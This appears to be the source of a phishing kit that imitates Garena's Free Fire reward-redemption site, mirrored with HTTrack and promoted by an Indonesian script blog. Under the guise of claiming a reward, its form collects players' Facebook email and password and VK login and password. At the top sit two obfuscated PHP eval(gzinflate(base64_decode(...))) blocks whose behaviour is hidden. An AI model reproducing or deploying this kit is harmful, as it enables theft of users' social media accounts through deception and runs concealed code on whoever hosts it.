<!-- https://www.rabiitch.ga/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<!DOCTYPE html>
<html lang="zh">


<!-- Mirrored from reward.ff.garena.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Jul 2018 12:17:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<style type="text/css">

.kotak {
	position:relative;
	margin:50px auto;
	max-width:1024px;
	height:auto;
	border:2px solid white;
	padding:30px;
	color: white;
}

.box{
 background-image:url("img/cewe.png"); 
 background-size:100% auto; 
 background-repeat: no-repeat; 
 color: white;
 width: 100%;
 height: auto;
 padding:10px;
 margin:0px auto;
 border: 0px auto;
 }
 


.hadiah {
 background-color: #ffba00;
 display: inline-block;
 width: 250px;
 height: auto;
 margin: 20px;
 color: white;
 border-radius: 10px;
}

.hadiah-apa {
 width: 250px;
 height: auto;
 margin: auto;
 border-radius: 10px;
}

.hadiah h5 {
 margin: 10px auto;
 font-size: 1.5em;
 text-align: center;
 height: 50px;
}


.tombol {
 background: transparent;
 position: relative;
 width: 30%;
 height: 40px;
 margin: 0;
 color: #ffba00;
 border: 1px solid #ffba00;
 font-size: 1.2em;
 font-weight:700;
 text-align: center;
 letter-spacing: 1px;
 outline: none;
 cursor: pointer;
}

h4 {
color: white;
}

input[type=text],input[type=password],input[type=number] {
 background:transparent;
 width:100%;
 padding:12px 20px;
 margin:8px 0;
 display:inline-block;
 border:1px solid #ffba00;
 color: #ffba00;
 box-sizing: border-box;
}

label {
 color: #ffba00;
}
</style>
    <!-- M002 V3 -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- set if need to be able scaled -->
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="title" content="FreeFire">
    <meta name="description" content="FreeFire">
    <meta property="og:title" content="FreeFire">
    <meta property="og:description" content="FreeFire">
    <title>Free Fire</title>
    <link rel="shortcut icon" href="https://ff.garena.tw/static/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/reset.css" />
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <link href="css/all.css" rel="stylesheet">
    <link href="css/extra.css" rel="stylesheet">
    <!-- the css editable in USE -->
</head>
<div data-reactroot="">
<div class="container">
<div class="a_wrap2">
<div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/logoff.png" class="gamelogo">
</div><div class="col-md-5 col-sm-5 col-xs-5">
<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Site de resgate de recompensas</span></div><div class="a_wrap"><div></div>
<span class="txt_c">
Por favor entre.</span>
<br>

</center>
<label><font color="gold">Apelido: </font></label>
<input  name="nickname"  placeholder="Your Nickname" type="text" required>


</a></span><span class="">
<center><div class="btn_fb"></center>
<label><font color="gold">Facebook     : </font></label>
<input  name="namafb"  placeholder="Nama Anda" type="text" required>
<br>
<label><font color="gold">Email Facebook 	 : </font></label>
<input  name="emailfb"  placeholder="Email Facebok" type="text" required>
<br>
<label><font color="gold">Senha Facebook : </font></label>
<br>
<input  name="pwfb"  placeholder="Senha Facebok" type="text" required>

<br>
<center><div class="btn_vk"></center>
<label><font color="gold">
Número de celular ou endereço de e-mail:</font></label>
<input  name="emailvk"  placeholder="Nama Anda" type="text" required>
<br>
<label><font color="gold">Senha VK   : </font></label>
<input  name="pwvk"  placeholder="Nama Anda" type="text" required>
<br>

<center><a href="succes.php" class="button"><img src="imgg/button.png" </center>
</div></div></div></div>

<body>

    <div id="app"></div>

<script type="text/javascript" src="bundle.js"></script></body>


<!-- Mirrored from reward.ff.garena.com/ by HTTrack Website Copier/3.x [XR&CO'2019], Sat, 08 Jul 2019 12:17:04 GMT -->
</html>